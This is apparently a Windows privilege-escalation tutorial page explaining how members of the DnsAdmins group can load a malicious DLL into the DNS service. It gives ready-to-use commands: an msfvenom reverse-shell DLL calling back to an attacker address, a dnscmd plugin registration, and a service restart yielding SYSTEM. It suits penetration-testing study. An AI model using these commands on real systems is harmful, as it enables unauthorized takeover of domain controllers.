# DNS Admins

Members of the **DnsAdmins** group have access to the DNS information of the network. The permissions associated with this group by default include the ability to read, write, create, and delete child objects. This group typically exists only if the DNS server role is or was installed on a domain controller. [Learn More](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)

### Attack

A privilege escalation issue exists for users in this group, as they are allowed to change the DNS service registry configuration, which can load a DLL plugin that executes when the service starts. An attacker could reference a malicious DLL file in this configuration and gain SYSTEM-level execution on the machine.

First, create a malicious DLL with `msfvenom` using the following command:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.12.2 LPORT=4444 -f dll -o rev.dll
```

Next, configure the DNS service to point to the malicious DLL:

```batch
dnscmd.exe /config /serverlevelplugindll C:\Users\User\rev.dll
```

Finally, restart the DNS service to execute the DLL:

```batch
sc stop dns
sc start dns
```

## Example

First, verify membership in the **DnsAdmins** group. Listing privileges will show none of them as special, only that the user belongs to this group.

Create the reverse shell and configure the DNS service to point to the malicious DLL.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/dnsAdmin_1.png)

Restart the DNS service.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/dnsAdmin_2.png)

The reverse shell immediately connects as SYSTEM.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/dnsAdmin_3.png)
